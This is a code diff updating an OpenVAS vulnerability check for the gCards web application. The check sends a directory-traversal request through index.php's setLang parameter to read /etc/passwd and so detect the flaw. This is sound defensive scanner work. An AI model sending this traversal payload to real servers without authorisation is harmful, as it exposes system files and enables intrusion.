@@ -1,5 +1,5 @@
 # OpenVAS Vulnerability Test
-# $Id: gcards_dir_transversal.nasl 4227 2016-10-07 05:45:35Z teissa $
+# $Id: gcards_dir_transversal.nasl 5779 2017-03-30 06:57:12Z cfi $
 # Description: gCards Multiple Vulnerabilities
 #
 # Authors:
@@ -42,67 +42,51 @@ files as well as a SQL injection and a cross-site scripting issue.";
 
 tag_solution = "Upgrade to gCards version 1.46 or later.";
 
-if (description) {
-script_id(80065);
-script_version("$Revision: 4227 $");
-script_tag(name:"last_modification", value:"$Date: 2016-10-07 07:45:35 +0200 (Fri, 07 Oct 2016) $");
-script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
-script_tag(name:"cvss_base", value:"7.5");
-script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-script_cve_id("CVE-2006-1346", "CVE-2006-1347", "CVE-2006-1348");
-script_bugtraq_id(17165);
-script_xref(name:"OSVDB", value:"24016");
-script_xref(name:"OSVDB", value:"24017");
-script_xref(name:"OSVDB", value:"24018");
-
-name = "gCards Multiple Vulnerabilities";
-script_name(name);
-
-summary = "Checks for directory transversal in gCards index.php script";
-script_category(ACT_ATTACK);
+if(description)
+{
+  script_id(80065);
+  script_version("$Revision: 5779 $");
+  script_tag(name:"last_modification", value:"$Date: 2017-03-30 08:57:12 +0200 (Thu, 30 Mar 2017) $");
+  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
+  script_tag(name:"cvss_base", value:"7.5");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
+  script_cve_id("CVE-2006-1346", "CVE-2006-1347", "CVE-2006-1348");
+  script_bugtraq_id(17165);
+  script_xref(name:"OSVDB", value:"24016");
+  script_xref(name:"OSVDB", value:"24017");
+  script_xref(name:"OSVDB", value:"24018");
+  script_name("gCards Multiple Vulnerabilities");
+  script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
-script_family("Web application abuses");
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2006 Josh Zlatin-Amishav");
+  script_dependencies("find_service.nasl", "http_version.nasl");
+  script_require_ports("Services/www", 80);
+  script_exclude_keys("Settings/disable_cgi_scanning");
 
-script_copyright("This script is Copyright (C) 2006 Josh Zlatin-Amishav");
+  script_tag(name : "solution" , value : tag_solution);
+  script_tag(name : "summary" , value : tag_summary);
+  script_xref(name : "URL" , value : "http://retrogod.altervista.org/gcards_145_xpl.html");
+  script_xref(name : "URL" , value : "http://www.gregphoto.net/index.php/2006/03/27/gcards-146-released-due-to-security-issues/");
 
-script_dependencies("http_version.nasl");
-script_require_ports("Services/www", 80);
-script_exclude_keys("Settings/disable_cgi_scanning");
-
-script_tag(name : "solution" , value : tag_solution);
-script_tag(name : "summary" , value : tag_summary);
-script_xref(name : "URL" , value : "http://retrogod.altervista.org/gcards_145_xpl.html");
-script_xref(name : "URL" , value : "http://www.gregphoto.net/index.php/2006/03/27/gcards-146-released-due-to-security-issues/");
-exit(0);
+  exit(0);
 }
 
-
-include("global_settings.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
 
-
 port = get_http_port(default:80);
-if (!get_port_state(port)) exit(0);
 if (!can_host_php(port:port)) exit(0);
 
+foreach dir( make_list_unique( "/gcards", cgi_dirs( port:port ) ) ) {
 
-dirs = make_list("/gcards", cgi_dirs());
-
-# Loop through CGI directories.
-foreach dir (dirs) {
+  if( dir == "/" ) dir = "";
   # Try to exploit the flaw in setLang.php to read /etc/passwd.
   lang = SCRIPT_NAME;
-  req = http_get(
-    item:string(
-    dir, "/index.php?",
-    "setLang=", lang, "&",
-    "lang[", lang, "][file]=../../../../../../../../../../../../etc/passwd"
-    ),
-    port:port
-  );
+  url = string( dir, "/index.php?setLang=", lang, "&lang[", lang, "][file]=../../../../../../../../../../../../etc/passwd");
+  req = http_get( item:url, port:port );
   res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
-  if (res == NULL) exit(0);
+  if (res == NULL) continue;
 
   # There's a problem if...
   if (
@@ -134,3 +118,5 @@ foreach dir (dirs) {
     exit(0);
   }
 }
+
+exit( 0 );
